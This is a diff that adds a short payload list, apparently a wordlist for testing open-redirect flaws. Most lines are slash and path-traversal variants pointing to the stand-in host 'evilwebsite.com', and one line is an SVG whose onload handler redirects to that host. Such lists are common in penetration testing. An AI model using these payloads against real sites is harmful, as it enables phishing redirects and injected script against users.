@@ -1,0 +1,9 @@
+//www.evilwebsite.com/%2e%2e
+///www.evilwebsite.com/%2e%2e
+//www.evilwebsite.com/
+///www.evilwebsite.com
+/www.evilwebsite.com/
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <svgonload="window.location='http://www.evilwebsite.com'" xmlns="http://www.w3.org/2000/svg"></svg>
+/../www.evilwebsite.com/
+/..//www.evilwebsite.com/
+/../..///www.evilwebsite.com/
